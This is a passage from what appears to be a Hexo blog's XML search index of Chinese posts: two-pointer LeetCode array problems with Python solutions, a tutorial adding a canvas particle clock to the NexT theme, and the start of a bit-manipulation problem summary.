。在坐标内画 n 条垂直线，垂直线 i 的两个端点分别为 (i, ai) 和 (i, 0)。找出其中的两条线，使得它们与 x 轴共同构成的容器可以容纳最多的水。说明：你不能倾斜容器，且 n 的值至少为 2。图中垂直线代表输入数组 [1,8,6,2,5,4,8,3,7]。在此情况下，容器能够容纳水（表示为蓝色部分）的最大值为 49。示例:12输入: [1,8,6,2,5,4,8,3,7]输出: 49思路这种方法背后的思路在于，两线段之间形成的区域总是会受到其中较短那条长度的限制。此外，两线段距离越远，得到的面积就越大。下面我们从公式来验证上面的结论：水槽面积公式：S(i,j)=min(h[i],h[j])×(j−i)若向内移动短板，水槽的短板 min(h[i], h[j]) 可能变大，因此水槽面积 S(i,j) 可能增大。若向内移动长板，水槽的短板 min(h[i], h[j]) 不变或变小，下个水槽的面积一定小于当前水槽面积。我们也会发现：若不指定移动规则，所有移动出现的 S(i,j) 的状态数为 C(n,2)，即暴力枚举出所有状态。在状态 S(i,j) 下向内移动短板至 S(i+1,j)（假设 h[i] &lt; h[j]），则相当于消去了 S(i,j−1),S(i,j−2),...,S(i,i+1) 状态集合。而所有消去状态的面积一定 &lt;=S(i,j)。Python实现具体步骤如下：我们在由线段长度构成的数组中使用两个指针，一个放在开始，一个置于末尾。 此外，我们会使用变量 maxarea 来持续存储到目前为止所获得的最大面积。 在每一步中，我们会找出指针所指向的两条线段形成的区域，更新 maxarea，并将指向较短线段的指针向较长线段那端移动一步。12345678910111213141516171819class Solution: def maxArea(self, height: List[int]) -&gt; int: left = 0 right = len(height) - 1 # 初始值 res = min(height[left],height[right]) * (len(height) - 1) while left &lt; right: # 更新maxarea if min(height[left],height[right]) * (right - left) &gt; res: res = min(height[left],height[right]) * (right - left) # 移动较短线段的指针 if height[left] &gt; height[right]: right -= 1 else: left += 1 return res611-有效三角形的个数题目描述给定一个包含非负整数的数组，你的任务是统计其中可以组成三角形三条边的三元组个数。示例 1:1234567输入: [2,2,3,4]输出: 3解释:有效的组合是: 2,3,4 (使用第一个 2)2,3,4 (使用第二个 2)2,2,3注意:数组长度不超过1000。数组里整数的范围为 [0, 1000]。思路三角形的性质：三角形的任何两边的和一定大于第三边，由此亦可证明得三角形的任意两边的差一定小于第三边。根据三角形的性质，我们会发现，只要小的两个边之和大于最长的那个边（a + b &gt; c），任意两边就一定大于第三边。数组排序，便于后序的处理固定最长的边c，然后采用双指针在其左侧寻找合适的a、b：a从最左侧开始（nums[0]）、b从最右侧开始（nums[i-1]）如果nums[left] + nums[right] &gt; nums[i]，说明[left,right]、[left+1,right]...[right-1,right]均满足条件，以nums[right]为中间边的情况已全部考虑过，然后right -= 1如果nums[left] + nums[right] &lt;= nums[i]，两边之和太小，需要增大，left += 1Python实现1234567891011121314151617181920class Solution: def triangleNumber(self, nums: List[int]) -&gt; int: # 排序 nums.sort() count = 0 for i in range(2,len(nums)): left = 0 right = i - 1 while left &lt; right: if nums[left] + nums[right] &gt; nums[i]: # 这些都可以：[left,right]、[left+1,right]...[right-1,right] count += right - left right -= 1 else: left += 1 return count时间复杂度：O(n^2)前向型指针-快慢指针快慢指针也是双指针，但是两个指针从同一侧开始遍历数组，将这两个指针分别定义为快指针（fast）和慢指针（slow），两个指针以不同的策略移动，直到两个指针的值相等（或其他特殊条件）为止，如fast每次增长两个，slow每次增长一个。26-删除排序数组中的重复项27-移除元素80-删除排序数组中的重复项283-移动零845-数组中的最长山脉904-水果成篮不少链表的题目可以用快慢指针来解决，由于本文主要双指针在数组中的应用，这里就不讨论了。26-删除排序数组中的重复项问题描述给定一个排序数组，你需要在原地删除重复出现的元素，使得每个元素只出现一次，返回移除后数组的新长度。不要使用额外的数组空间，你必须在原地修改输入数组并在使用 O(1) 额外空间的条件下完成。示例 1:给定数组 nums = [1,1,2], 函数应该返回新的长度 2, 并且原数组 nums 的前两个元素被修改为 1, 2。你不需要考虑数组中超出新长度后面的元素。示例 2:给定 nums = [0,0,1,1,1,2,2,3,3,4],函数应该返回新的长度 5, 并且原数组 nums 的前五个元素被修改为 0, 1, 2, 3, 4。你不需要考虑数组中超出新长度后面的元素。说明:为什么返回数值是整数，但输出的答案是数组呢?请注意，输入数组是以“引用”方式传递的，这意味着在函数里修改输入数组对于调用者是可见的。思路数组完成排序后，我们可以放置两个指针 i 和 j，其中 i 是慢指针，而 j 是快指针。只要 nums[i] = nums[j]，我们就增加 j 以跳过重复项。当我们遇到 nums[j] != nums[i] 时，跳过重复项的运行已经结束，因此我们必须把它（nums[j]）的值复制到 nums[i + 1]。然后递增 i，接着我们将再次重复相同的过程，直到 j 到达数组的末尾为止。图解：来源：【双指针】删除重复项-带优化思路Python实现123456789101112class Solution: def removeDuplicates(self, nums: List[int]) -&gt; int: i = 0 j = 1 while j &lt; len(nums): if nums[j] == nums[i]: j += 1 else: i += 1 nums[i] = nums[j] j += 1 return i+127-移除元素问题描述给定一个数组 nums 和一个值 val，你需要原地移除所有数值等于 val 的元素，返回移除后数组的新长度。不要使用额外的数组空间，你必须在原地修改输入数组并在使用 O(1) 额外空间的条件下完成。元素的顺序可以改变。你不需要考虑数组中超出新长度后面的元素。示例 1:给定 nums = [3,2,2,3], val = 3,函数应该返回新的长度 2, 并且 nums 中的前两个元素均为 2。你不需要考虑数组中超出新长度后面的元素。示例 2:给定 nums = [0,1,2,2,3,0,4,2], val = 2,函数应该返回新的长度 5, 并且 nums 中的前五个元素为 0, 1, 3, 0, 4。注意这五个元素可为任意顺序。你不需要考虑数组中超出新长度后面的元素。思路我们可以保留两个指针 i 和 j，其中 i 是慢指针，j 是快指针。当 nums[j] 与给定的值相等时，递增 j 以跳过该元素。只要 nums[j] != val，我们就复制 nums[j] 到 nums[i] 并同时递增两个索引。重复这一过程，直到 j 到达数组的末尾，该数组的新长度为 i。Python实现123456789101112class Solution: def removeElement(self, nums: List[int], val: int) -&gt; int: i = 0 j = 0 while j &lt; len(nums): if nums[j] == val: j += 1 elif nums[j] != val: nums[i] = nums[j] i += 1 j += 1 return i时间复杂度：O(n)，假设数组总共有 n 个元素，i 和 j 至少遍历 2n 步。空间复杂度：O(1)。进阶做法现在考虑数组包含很少的要删除的元素的情况。例如， num=[4，1，2，3，5]，Val=4。似乎没有必要将 [1，2，3，5] 这几个元素左移一步，因为问题描述中提到元素的顺序可以更改。当我们遇到 nums[i] = val 时，我们可以将当前元素与最后一个元素进行交换，并释放最后一个元素。这实际上使数组的大小减少了 1。请注意，被交换的最后一个元素可能是您想要移除的值。但是不要担心，在下一次迭代中，我们仍然会检查这个元素。1234567891011class Solution: def removeElement(self, nums: List[int], val: int) -&gt; int: j = 0 last = len(nums)-1 while j &lt;= last: if nums[j] == val: nums[j] = nums[last] last -= 1 else: j += 1 return last+1注意：while循环中的判断条件应该是j &lt;= last而不是j &lt; len(nums)。时间复杂度：O(n)，j 和 last 最多遍历 n 步。在这个方法中，赋值操作的次数等于要删除的元素的数量。因此，如果要移除的元素很少，效率会更高。空间复杂度：O(1)。80-删除排序数组中的重复项题目描述给定一个排序数组，你需要在原地删除重复出现的元素，使得每个元素最多出现两次，返回移除后数组的新长度。不要使用额外的数组空间，你必须在原地修改输入数组并在使用 O(1) 额外空间的条件下完成。示例 1:给定 nums = [1,1,1,2,2,3],函数应返回新长度 length = 5, 并且原数组的前五个元素被修改为 1, 1, 2, 2, 3 。你不需要考虑数组中超出新长度后面的元素。示例 2:给定 nums = [0,0,1,1,1,1,2,3,3],函数应返回新长度 length = 7, 并且原数组的前五个元素被修改为 0, 0, 1, 1, 2, 3, 3 。你不需要考虑数组中超出新长度后面的元素。思路遍历整个表：把当前的元素与它前面的对比，如果二者元素相同（为重复元素）：此时统计重复的计数器count+=1。题目要求只保留2个重复的元素，这里需要加入重复元素个数的判断：这个元素正好重复了2次 =&gt; 则进行保留。列表长度i+=1，然后nums[i]=nums[j]；这个元素重复多于2次 =&gt; 不进行任何操作。体现在程序上不做处理把当前的元素与它前面的对比，如果二者元素不同（为新元素）：此时把当前这个结点(nums[j])添加到新表里面去，nums[i] = nums[j],表长i+1。Python实现123456789101112131415161718192021222324class Solution: def removeDuplicates(self, nums: List[int]) -&gt; int: count = 1 i = 0 j = 1 while j &lt; len(nums): # 二者元素相同（重复元素） if nums[i] == nums[j]: count += 1 # 这个元素正好重复了2次 if count == 2: i += 1 nums[i] = nums[j] # 这个元素重复多于2次 else: pass j += 1 # 二者元素不同（新元素） else: i += 1 nums[i] = nums[j] count = 1 j += 1 return i+1283-移动零问题描述给定一个数组 nums，编写一个函数将所有 0 移动到数组的末尾，同时保持非零元素的相对顺序。示例:输入: [0,1,0,3,12]输出: [1,3,12,0,0]说明:必须在原数组上操作，不能拷贝额外的数组。尽量减少操作次数。思路nums中，i指针用于存放非零元素j指针用于遍历寻找非零元素（注：j指针找到一个非零元素后，方法nums[i]的位置i++，用于下一个j指针找到的非零元素）j指针遍历完后，最后nums数组还有空位置，存放0即可Python实现12345678910111213141516class Solution: def moveZeroes(self, nums: List[int]) -&gt; None: i = 0 j = 0 # 双指针遍历寻找非零元素 while j &lt; len(nums): if nums[j] == 0: j += 1 else: nums[i] = nums[j] i += 1 j += 1 # 空位置赋0 for k in range(i,len(nums)): nums[k] = 0845-数组中的最长山脉题目描述我们把数组 A 中符合下列属性的任意连续子数组 B 称为 “山脉”：B.length &gt;= 3存在 0 &lt; i &lt; B.length - 1 使得 B[0] &lt; B[1] &lt; ... B[i-1] &lt; B[i] &gt; B[i+1] &gt; ... &gt; B[B.length - 1]注意：B 可以是 A 的任意子数组，包括整个数组 A。给出一个整数数组 A，返回最长 “山脉” 的长度。如果不含有 “山脉” 则返回 0。示例 1：123输入：[2,1,4,7,3,2,5]输出：5解释：最长的 “山脉” 是 [1,4,7,3,2]，长度为 5。示例 2：123输入：[2,2,2]输出：0解释：不含 “山脉”。提示：0 &lt;= A.length &lt;= 100000 &lt;= A[i] &lt;= 10000思路首先固定山峰值，然后分别寻找左、右半边山脉的长度。A[left] &lt; A[left+1]，继续向左寻找A[right] &lt; A[right-1]，继续向右寻找如果以当前山峰的山脉长度比最长山脉长，更新最长山脉。注意：我们可以在只有当前点为山峰的情况（即A[i-1] &lt; A[i] and A[i+1] &lt; A[i]），才在左右寻找最长山峰，这样可以大大降低搜索的次数。Python实现123456789101112131415161718192021222324252627class Solution: def longestMountain(self, A: List[int]) -&gt; int: if len(A) &lt; 3: return 0 res = 0 # 固定山峰 for i in range(1,len(A)-1): # 只有当前点为山峰的情况，才在左右寻找最长山峰 if A[i-1] &lt; A[i] and A[i+1] &lt; A[i]: left = i - 1 right = i + 1 # 左半边山脉的长度 while left &gt;= 0 and A[left] &lt; A[left+1]: left -= 1 # 右半边山脉的长度 while right &lt;= len(A)-1 and A[right] &lt; A[right-1]: right += 1 # 如果这个山脉比最长的山脉长，更新res if right - left - 1 &gt; res: res = right - left - 1 return res前向型指针-滑动窗口有些时候，我们需要获得数组或者字符串的连续子部分，这时候我们就可以考虑使用滑动窗口。nums[left,right]为滑动窗口，根据具体的要求，通过遍历的时候，来改变left和right的位置，从而完成任务。209-长度最小的子数组713-乘积小于K的子数组由于本文主要关注双指针在数组中的应用，这里就不讨论字符串相关的题目了。209-长度最小的子数组题目描述给定一个含有 n 个正整数的数组和一个正整数 s ，找出该数组中满足其和 ≥ s 的长度最小的连续子数组。如果不存在符合条件的连续子数组，返回 0。示例:123输入: s = 7, nums = [2,3,1,2,4,3]输出: 2解释: 子数组 [4,3] 是该条件下的长度最小的连续子数组。进阶:如果你已经完成了O(n) 时间复杂度的解法, 请尝试 O(n log n) 时间复杂度的解法。思路在一个坐标上存在两个指针left和right，left代表滑窗的左边框，right代表滑窗的右边框。两者分别向右滑动，前者能使窗口之间的和减小，后者能使窗口之间的和增大。开始时二者重合，窗口的和就是重合点所在的数。开始right向右滑动，使和变大。当恰好&gt;=s时，记录滑窗所包括的子数组长度res，若res已有数值，需判断新值是否小于旧值，若是，更新res；left向右滑动。判断是否仍&gt;=s，若是，重复步骤2，3。若否，转步骤1。直到右边框到达最右边。Python实现1234567891011121314151617class Solution: def minSubArrayLen(self, s: int, nums: List[int]) -&gt; int: # 初始化 left,sums,res = 0,0,float('inf') # 右指针右移 for right in range(len(nums)): sums += nums[right] while sums &gt;= s: # 若新值小于旧值，更新res if right - left + 1 &lt; res: res = right - left + 1 # 左指针向右滑动 sums -= nums[left] left += 1 return 0 if res == float('inf') else res时间复杂度：O(n)空间复杂度：O(1)713-乘积小于K的子数组题目描述给定一个正整数数组 nums。找出该数组内乘积小于 k 的连续的子数组的个数。示例 1:1234输入: nums = [10,5,2,6], k = 100输出: 8解释: 8个乘积小于100的子数组分别为: [10], [5], [2], [6], [10,5], [5,2], [2,6], [5,2,6]。需要注意的是 [10,5,2] 并不是乘积小于100的子数组。说明:0 &lt; nums.length &lt;= 500000 &lt; nums[i] &lt; 10000 &lt;= k &lt; 10^6思路步骤1：当left &lt;= right且滑动窗口内的乘积小于k时，我们可以知道[left,right]、[left+1,right]...[right-1,right]均满足条件，因此，计数加right-left+1，然后移动右边界（滑动区间加大），看剩下的区间是否满足乘积小于k，如果小于k，重复步骤1，否则进行步骤2。步骤2：当滑动窗口内的乘积大于等于k时，右移左边界（滑动区间减小），如果这个区间内乘积小于k，进入步骤1，否则重复步骤2。Python实现123456789101112131415class Solution: def numSubarrayProductLessThanK(self, nums: List[int], k: int) -&gt; int: left = 0 product = 1 count = 0 for right in range(len(nums)): # 右边界右移 product *= nums[right] # 如果乘积&gt;=k，左边界右移 while left &lt;= right and product &gt;= k: product /= nums[left] left += 1 # 当前右边界下，满足条件的数组 count += right - left + 1 return count分离双指针输入是两个数组/链表，两个指针分别在两个容器中移动；根据问题的不同，初始位置可能都在头部，或者都在尾部，或一头一尾。349-两个数组的交集350-两个数组的交集88-合并两个有序数组349-两个数组的交集题目描述给定两个数组，编写一个函数来计算它们的交集。示例 1:12输入: nums1 = [1,2,2,1], nums2 = [2,2]输出: [2]示例 2:12输入: nums1 = [4,9,5], nums2 = [9,4,9,8,4]输出: [9,4]说明:输出结果中的每个元素一定是唯一的。我们可以不考虑输出结果的顺序。思路我先对两个数组进行排序。然后再运用双指针遍历两个数组，将交集中的元素加入到 set() 中。set() 可以非常方便的去重。Python实现12345678910111213141516171819class Solution: def intersection(self, nums1: List[int], nums2: List[int]) -&gt; List[int]: # 排序 nums1.sort() nums2.sort() i,j = 0,0 nums_set = set() while i &lt; len(nums1) and j &lt; len(nums2): if nums1[i] &gt; nums2[j]: j += 1 elif nums1[i] &lt; nums2[j]: i += 1 elif nums1[i] == nums2[j]: nums_set.add(nums1[i]) i += 1 j += 1 return nums_set其他方法——运用set()的方法我们可以将两个数组转换为集合 set，然后直接用内置的交集即可得到结果。12345class Solution: def intersection(self, nums1: List[int], nums2: List[int]) -&gt; List[int]: set1 = set(nums1) set2 = set(nums2) return set1 &amp; set2时间复杂度：O(m+n)，其中 n 和 m 是数组的长度。O(n) 的时间用于转换 nums1 在集合中，O(m) 的时间用于转换 nums2 到集合中，并且平均情况下，集合的操作为 O(1)。空间复杂度：O(m+n)，最坏的情况是数组中的所有元素都不同。350-两个数组的交集题目描述给定两个数组，编写一个函数来计算它们的交集。示例 1:12输入: nums1 = [1,2,2,1], nums2 = [2,2]输出: [2,2]示例 2:12输入: nums1 = [4,9,5], nums2 = [9,4,9,8,4]输出: [4,9]说明：输出结果中每个元素出现的次数，应与元素在两个数组中出现的次数一致。我们可以不考虑输出结果的顺序。思路我先对两个数组进行排序。然后再运用双指针遍历两个数组，将交集中的元素加入到 列表 中。本题跟349. 两个数组的交集的区别在于，本题不需要去重，因此用列表而不是集合保存结果。Python实现1234567891011121314151617181920class Solution: def intersect(self, nums1: List[int], nums2: List[int]) -&gt; List[int]: # 排序 nums1.sort() nums2.sort() i,j = 0,0 res = [] while i &lt; len(nums1) and j &lt; len(nums2): if nums1[i] &gt; nums2[j]: j += 1 elif nums1[i] &lt; nums2[j]: i += 1 elif nums1[i] == nums2[j]: res.append(nums1[i]) i += 1 j += 1 return res88-合并两个有序数组题目描述给定两个有序整数数组 nums1 和 nums2，将 nums2 合并到 nums1 中，使得 num1 成为一个有序数组。说明:初始化 nums1 和 nums2 的元素数量分别为 m 和 n。你可以假设 nums1 有足够的空间（空间大小大于或等于 m + n）来保存 nums2 中的元素。示例:12345输入:nums1 = [1,2,3,0,0,0], m = 3nums2 = [2,5,6], n = 3输出: [1,2,2,3,5,6]思路这个题目可以参考归并排序中的方法来解决。具体见。]]></content>
      <categories>
        <category>计算机基础</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>LeetCode</tag>
        <tag>数组</tag>
        <tag>双指针</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hexo-NexT增加canvas粒子时钟]]></title>
    <url>%2Farchives%2Fdd68b70.html</url>
    <content type="text"><![CDATA[网上看到一款不错的canvas粒子时钟，下面是在NexT主题增加的步骤。canvas粒子时钟引入在/themes/next/layout/_custom/目录下，新建clock.swig文件，内容如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264&lt;div style=""&gt; &lt;canvas id="canvas" style="width:60%;"&gt;当前浏览器不支持canvas，请更换浏览器后再试&lt;/canvas&gt;&lt;/div&gt;&lt;script&gt;(function()&#123; var digit= [ [ [0,0,1,1,1,0,0], [0,1,1,0,1,1,0], [1,1,0,0,0,1,1], [1,1,0,0,0,1,1], [1,1,0,0,0,1,1], [1,1,0,0,0,1,1], [1,1,0,0,0,1,1], [1,1,0,0,0,1,1], [0,1,1,0,1,1,0], [0,0,1,1,1,0,0] ],//0 [ [0,0,0,1,1,0,0], [0,1,1,1,1,0,0], [0,0,0,1,1,0,0], [0,0,0,1,1,0,0], [0,0,0,1,1,0,0], [0,0,0,1,1,0,0], [0,0,0,1,1,0,0], [0,0,0,1,1,0,0], [0,0,0,1,1,0,0], [1,1,1,1,1,1,1] ],//1 [ [0,1,1,1,1,1,0], [1,1,0,0,0,1,1], [0,0,0,0,0,1,1], [0,0,0,0,1,1,0], [0,0,0,1,1,0,0], [0,0,1,1,0,0,0], [0,1,1,0,0,0,0], [1,1,0,0,0,0,0], [1,1,0,0,0,1,1], [1,1,1,1,1,1,1] ],//2 [ [1,1,1,1,1,1,1], [0,0,0,0,0,1,1], [0,0,0,0,1,1,0], [0,0,0,1,1,0,0], [0,0,1,1,1,0,0], [0,0,0,0,1,1,0], [0,0,0,0,0,1,1], [0,0,0,0,0,1,1], [1,1,0,0,0,1,1], [0,1,1,1,1,1,0] ],//3 [ [0,0,0,0,1,1,0], [0,0,0,1,1,1,0], [0,0,1,1,1,1,0], [0,1,1,0,1,1,0], [1,1,0,0,1,1,0], [1,1,1,1,1,1,1], [0,0,0,0,1,1,0], [0,0,0,0,1,1,0], [0,0,0,0,1,1,0], [0,0,0,1,1,1,1] ],//4 [ [1,1,1,1,1,1,1], [1,1,0,0,0,0,0], [1,1,0,0,0,0,0], [1,1,1,1,1,1,0], [0,0,0,0,0,1,1], [0,0,0,0,0,1,1], [0,0,0,0,0,1,1], [0,0,0,0,0,1,1], [1,1,0,0,0,1,1], [0,1,1,1,1,1,0] ],//5 [ [0,0,0,0,1,1,0], [0,0,1,1,0,0,0], [0,1,1,0,0,0,0], [1,1,0,0,0,0,0], [1,1,0,1,1,1,0], [1,1,0,0,0,1,1], [1,1,0,0,0,1,1], [1,1,0,0,0,1,1], [1,1,0,0,0,1,1], [0,1,1,1,1,1,0] ],//6 [ [1,1,1,1,1,1,1], [1,1,0,0,0,1,1], [0,0,0,0,1,1,0], [0,0,0,0,1,1,0], [0,0,0,1,1,0,0], [0,0,0,1,1,0,0], [0,0,1,1,0,0,0], [0,0,1,1,0,0,0], [0,0,1,1,0,0,0], [0,0,1,1,0,0,0] ],//7 [ [0,1,1,1,1,1,0], [1,1,0,0,0,1,1], [1,1,0,0,0,1,1], [1,1,0,0,0,1,1], [0,1,1,1,1,1,0], [1,1,0,0,0,1,1], [1,1,0,0,0,1,1], [1,1,0,0,0,1,1], [1,1,0,0,0,1,1], [0,1,1,1,1,1,0] ],//8 [ [0,1,1,1,1,1,0], [1,1,0,0,0,1,1], [1,1,0,0,0,1,1], [1,1,0,0,0,1,1], [0,1,1,1,0,1,1], [0,0,0,0,0,1,1], [0,0,0,0,0,1,1], [0,0,0,0,1,1,0], [0,0,0,1,1,0,0], [0,1,1,0,0,0,0] ],//9 [ [0,0,0,0,0,0,0], [0,0,1,1,1,0,0], [0,0,1,1,1,0,0], [0,0,1,1,1,0,0], [0,0,0,0,0,0,0], [0,0,0,0,0,0,0], [0,0,1,1,1,0,0], [0,0,1,1,1,0,0], [0,0,1,1,1,0,0], [0,0,0,0,0,0,0] ]//: ];var canvas = document.getElementById('canvas');if(canvas.getContext)&#123; var cxt = canvas.getContext('2d'); //声明canvas的宽高 var H = 100,W = 700; canvas.height = H; canvas.width = W; cxt.fillStyle = '#f00'; cxt.fillRect(10,10,50,50); //存储时间数据 var data = []; //存储运动的小球 var balls = []; //设置粒子半径 var R = canvas.height/20-1; (function()&#123; var temp = /(\d)(\d):(\d)(\d):(\d)(\d)/.exec(new Date()); //存储时间数字，由十位小时、个位小时、冒号、十位分钟、个位分钟、冒号、十位秒钟、个位秒钟这7个数字组成 data.push(temp[1],temp[2],10,temp[3],temp[4],10,temp[5],temp[6]); &#125;)(); /*生成点阵数字*/ function renderDigit(index,num)&#123; for(var i = 0; i &lt; digit[num].length; i++)&#123; for(var j = 0; j &lt; digit[num][i].length; j++)&#123; if(digit[num][i][j] == 1)&#123; cxt.beginPath(); cxt.arc(14*(R+2)*index + j*2*(R+1)+(R+1),i*2*(R+1)+(R+1),R,0,2*Math.PI); cxt.closePath(); cxt.fill(); &#125; &#125; &#125; &#125; /*更新时钟*/ function updateDigitTime()&#123; var changeNumArray = []; var temp = /(\d)(\d):(\d)(\d):(\d)(\d)/.exec(new Date()); var NewData = []; NewData.push(temp[1],temp[2],10,temp[3],temp[4],10,temp[5],temp[6]); for(var i = data.length-1; i &gt;=0 ; i--)&#123; //时间发生变化 if(NewData[i] !== data[i])&#123; //将变化的数字值和在data数组中的索引存储在changeNumArray数组中 changeNumArray.push(i+'_'+(Number(data[i])+1)%10); &#125; &#125; //增加小球 for(var i = 0; i&lt; changeNumArray.length; i++)&#123; addBalls.apply(this,changeNumArray[i].split('_')); &#125; data = NewData.concat(); &#125; /*更新小球状态*/ function updateBalls()&#123; for(var i = 0; i &lt; balls.length; i++)&#123; balls[i].stepY += balls[i].disY; balls[i].x += balls[i].stepX; balls[i].y += balls[i].stepY; if(balls[i].x &gt; W + R || balls[i].y &gt; H + R)&#123; balls.splice(i,1); i--; &#125; &#125; &#125; /*增加要运动的小球*/ function addBalls(index,num)&#123; var numArray = [1,2,3]; var colorArray = ["#3BE","#09C","#A6C","#93C","#9C0","#690","#FB3","#F80","#F44","#C00"]; for(var i = 0; i &lt; digit[num].length; i++)&#123; for(var j = 0; j &lt; digit[num][i].length; j++)&#123; if(digit[num][i][j] == 1)&#123; var ball = &#123; x:14*(R+2)*index + j*2*(R+1)+(R+1), y:i*2*(R+1)+(R+1), stepX:Math.floor(Math.random() * 4 -2), stepY:-2*numArray[Math.floor(Math.random()*numArray.length)], color:colorArray[Math.floor(Math.random()*colorArray.length)], disY:1 &#125;; balls.push(ball); &#125; &#125; &#125; &#125; /*渲染*/ function render()&#123; //重置画布宽度，达到清空画布的效果 canvas.height = 100; //渲染时钟 for(var i = 0; i &lt; data.length; i++)&#123; renderDigit(i,data[i]); &#125; //渲染小球 for(var i = 0; i &lt; balls.length; i++)&#123; cxt.beginPath(); cxt.arc(balls[i].x,balls[i].y,R,0,2*Math.PI); cxt.fillStyle = balls[i].color; cxt.closePath(); cxt.fill(); &#125; &#125; clearInterval(oTimer); var oTimer = setInterval(function()&#123; //更新时钟 updateDigitTime(); //更新小球状态 updateBalls(); //渲染 render(); &#125;,50);&#125;&#125;)();&lt;/script&gt;在/themes/next/layout/_custom/sidebar.swig中引入：1&#123;% include &apos;./clock.swig&apos; %&#125;在/themes/next/layout/_macro/sidebar.swig中引入：12345678910111213141516171819202122232425262728293031 &lt;div class="site-overview-wrap sidebar-panel&#123;% if not display_toc or toc(page.content).length &lt;= 1 %&#125; sidebar-panel-active&#123;% endif %&#125;"&gt; &lt;div class="site-overview"&gt; ... &#123;% if theme.recent_posts %&#125; &lt;div class="links-of-blogroll motion-element &#123;&#123; "links-of-blogroll-" + theme.recent_posts_layout &#125;&#125;"&gt; &lt;div class="links-of-blogroll-title"&gt; &lt;!-- modify icon to fire by szw --&gt; &lt;i class="fa fa-history fa-&#123;&#123; theme.recent_posts_icon | lower &#125;&#125;" aria-hidden="true"&gt;&lt;/i&gt; &#123;&#123; theme.recent_posts_title &#125;&#125; &lt;/div&gt; &lt;ul class="links-of-blogroll-list"&gt; &#123;% set posts = site.posts.sort('-date') %&#125; &#123;% for post in posts.slice('0', '5') %&#125; &lt;li&gt; &lt;a href="&#123;&#123; url_for(post.path) &#125;&#125;" title="&#123;&#123; post.title &#125;&#125;" target="_blank"&gt;&#123;&#123; post.title &#125;&#125;&lt;/a&gt; &lt;/li&gt; &#123;% endfor %&#125; &lt;/ul&gt; &lt;/div&gt; &#123;% endif %&#125;+ &#123;% if theme.custom_file_path.sidebar %&#125;+ &#123;% set custom_sidebar = '../../../../' + theme.custom_file_path.sidebar %&#125;+ &#123;% else %&#125;+ &#123;% set custom_sidebar = '../_custom/sidebar.swig' %&#125;+ &#123;% endif %&#125;+ &#123;% include custom_sidebar %&#125; &lt;/div&gt; &lt;/div&gt;这里我放在侧栏的末尾。canvas粒子时钟样式在/themes/next/source/css/_custom/custom.styl添加：12345678// 粒子时钟样式.site-overview &#123; text-align: center;&#125;canvas#canvas &#123; margin-top: 20px;&#125;参考canvas粒子时钟Hexo NexT主题美化2.0]]></content>
      <categories>
        <category>工具使用</category>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>NexT</tag>
        <tag>粒子时钟</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[LeetCode题目总结-位运算]]></title>
    <url>%2Farchives%2Ffa228c3f.html</url>
    <content type="text"><![CDATA[位运算(Bit Manipulation)一直是程序员面试中的一个必须准备的主题，不过现在面试中位运算出现的次数并不多，主要原因还是位运算太考察技巧了，很多时候很难在短时间内想出来，所以作为面试的题目显得有点太花时间了。下面是本文的题目目录：汉明距离相关题目191-位1的个数461-汉明距离477-汉明距离总和只出现一次的数字相关题目136-只出现一次的数字137-只出现一次的数字ii260-只出现一次的数字iii反转相关题目190-颠倒二进制位476-数字的补数全组合相关题目78-子集数学相关题目29-两数相除201-数字范围按位与371-两整数之和其他类型题目693-交替位二进制数基础知识与常用技巧基本的位运算知识：与运算（&amp;）1230 &amp; 0 = 01 &amp; 1 = 11 &amp; 0 = 0或运算（|）1230 | 0 = 01 | 0 = 11 | 1 = 1异或运算（^）1231 ^ 1 = 01 ^ 0 = 10 ^ 0 = 0根据上面的知识我们可以知道：两个相同的数异或的结果为0，而0与任何一个数异或的结果为这个数。常用技巧：n &amp; (n-1)能够消灭n中最右侧的一个1。右移：除以2；左移：乘以2。异或性质：交换律，0^a=a, a^a=0。我们可以将常用字符、数字等均转为按位运算，可以节约空间。汉明距离(Hamming Weight)相关题目191-位1的个数问题描述编写一个函数，输入是一个无符号整数，返回其二进制表达式中数字位数为 ‘1’ 的个数（也被称为汉明重量）。示例 1：123输入：00000000000000000000000000001011输出：3解释：输入的二进制串 00000000000000000000000000001011 中，共有三位为 &apos;1&apos;。示例 2：123输入：00000000000000000000000010000000输出：1解释：输入的二进制串 00000000000000000000000010000000 中，共有一位为 &apos;1&apos;。示例 3：123输入：11111111111111111111111111111101输出：31解释：输入的二进制串 11111111111111111111111111111101 中，共有 31 位为 &apos;1&apos;。思路我们遍历数字的 32 位。如果某一位是 1 ，将计数器加一。进阶做法：我们可以把前面的算法进行优化。我们不再检查数字的每一个位，而是不断把数字最后一个 1 反转，并把答案加一。当数字变成 0 的时候，我们就知道它没有 1 的位了，此时返回答案。这里关键的想法是对于任意数字 n ，将 n 和 n - 1 做按位与运算，会把最后一个 1 的位变成 0 。Python实现123456789101112class Solution(object): def hammingWeight(self, n): """ :type n: int :rtype: int """ count = 0 while n != 0: # 将 n 和 n - 1 做按位与运算，把最后一个 1 的位变成 0，得到新的n n = n &amp; (n-1) count += 1 return count461-汉明距离题目描述两个整数之间的汉明距离指的是这两个数字对应二进制位不同的位置的数目。给出两个整数 x 和 y，计算它们之间的汉明距离。注意：0 ≤ x, y &lt; 231.示例:12345678910输入: x = 1, y = 4输出: 2解释:1 (0 0 0 1)4 (0 1 0 0) ↑ ↑上面的箭头指出了对应二进制位不同的位置。思路我们先对两个数进行异或，然后计算其中“1”的个数，即为这两个数的汉明距离。Python实现123456789101112class Solution: def hammingDistance(self, x: int, y: int) -&gt; int: # 异或 a = x ^ y # 计算“1”的个数 count = 0 while a != 0: a = a &amp; (a-1) count += 1 return count477-汉明距离总和题目描述两个整数的 汉明距离 指的是这两个数字的二进制数对应位不同的数量。计算一个数组中，任意两个数之间汉明距离的总和。示例:输入: 4, 14, 2输出: 6解释: 在二进制表示中，4表示为0100，14表示为1110，2表示为0010。（这样表示是为了体现后四位之间关系）答案：HammingDistance(4, 14) + HammingDistance(4, 2) + HammingDistance(14, 2) = 2 + 2 